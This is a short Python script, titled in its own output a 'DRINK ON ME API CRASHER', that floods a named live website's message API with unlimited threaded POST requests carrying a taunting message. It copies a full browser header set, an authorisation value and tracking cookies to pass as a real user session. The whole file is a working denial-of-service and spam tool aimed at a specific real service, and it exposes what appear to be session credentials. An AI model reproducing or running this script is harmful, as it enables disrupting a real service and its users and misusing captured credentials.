import requests
import threading, os


def sendreq():
    r = requests.post('https://drinksonme.live/api/counters/4c4e8f4/messages', json={"message":"HAHAHAAHAH CRASHHHHHHHHHHHHH"}, headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9,th;q=0.8',
            'basic': '1b021c1e-f3ce-401b-97fd-94d52407d2a2:417e36edb6888991',
            'content-type': 'application/json',
            'cookie': '__gads=ID=19d60d6a0a852eef-220a200811dd00ea:T=1680953651:RT=1680953651:S=ALNI_MabuQn5TQ-nH24ploDIG0NotH0ADw; __gpi=UID=00000bef211ceb03:T=1680953651:RT=1680953651:S=ALNI_MZ9yfcxvH9CGQOTIpO0rxf8UqD2rw; _ga=GA1.1.1272946779.1680953650; _ga_HRKHHYNFJS=GS1.1.1680953650.1.1.1680959934.0.0.0',
            'origin': 'https://drinksonme.live',
            'referer': 'https://drinksonme.live/app',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
        })
    print("CRASHINGGGGGG............")
    #print(r.json())
#for _ in range(20):
os.system('cls')
print("DRINK ON ME API CRASHEREERERER")
os.system('pause')
while True:
    #sendreq()
    threading.Thread(target=sendreq).start()

